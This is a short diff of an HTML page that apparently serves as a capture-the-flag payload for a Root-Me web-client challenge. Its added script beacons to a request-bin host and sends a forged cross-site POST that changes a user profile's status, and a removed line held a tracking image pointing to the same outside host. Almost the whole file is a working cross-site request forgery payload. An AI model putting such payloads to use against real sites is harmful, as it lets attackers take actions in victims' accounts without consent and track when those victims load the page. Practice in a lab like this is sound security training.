@@ -2,9 +2,13 @@
 
 <html>
     <body>
-        <img src="https://enxdf4rj2i4ar.x.pipedream.net/gh-img" />
         <script>
-            fetch("https://enxdf4rj2i4ar.x.pipedream.net/gh-fetch");
+            fetch("https://enxdf4rj2i4ar.x.pipedream.net/gh-admin");
+
+            var xhttp = new XMLHttpRequest();
+            xhttp.open("POST", "http://challenge01.root-me.org/web-client/ch22/?action=profile", true);
+            xhttp.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
+            xhttp.send("username=test4&status=on");
         </script>
     </body>
 </html>
